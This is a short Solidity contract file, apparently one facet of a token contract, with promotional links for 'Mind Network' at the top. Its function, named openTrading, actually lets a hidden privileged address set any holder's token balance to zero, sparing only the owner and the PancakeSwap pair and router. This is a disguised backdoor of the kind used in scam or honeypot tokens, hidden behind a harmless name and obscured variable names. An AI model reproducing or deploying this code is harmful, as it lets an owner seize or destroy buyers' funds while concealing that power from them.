/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/MindNetwork_xyz
    // Twitter: https://twitter.com/mindnetwork_xyz
    // Website: https://mindnetwork.xyz/
    // Discord: https://discord.com/invite/UYj94MJdGJ
    // Medium:  https://mindnetwork.medium.com/

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
